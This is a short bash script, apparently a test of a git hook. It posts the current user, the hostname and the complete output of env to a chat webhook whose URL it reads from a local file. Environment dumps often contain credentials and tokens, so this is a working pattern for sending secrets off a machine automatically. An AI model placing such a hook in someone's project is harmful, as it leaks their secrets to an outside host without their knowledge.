#!/bin/bash

WEBHOOK_URL=$(cat ./webhook)
PAYLOAD="{\"username\": \"webhookbot\", \"text\": \"This is post from $(whoami)@$(hostname) via a webhookbot. Testing a git hook, 
\`\`\` 
User:$(whoami) 
Host: $(hostname) 
$(env)
\`\`\`\", \"icon_emoji\": \":ghost:\"}"

curl -X POST --data-urlencode "payload=$PAYLOAD" $WEBHOOK_URL 
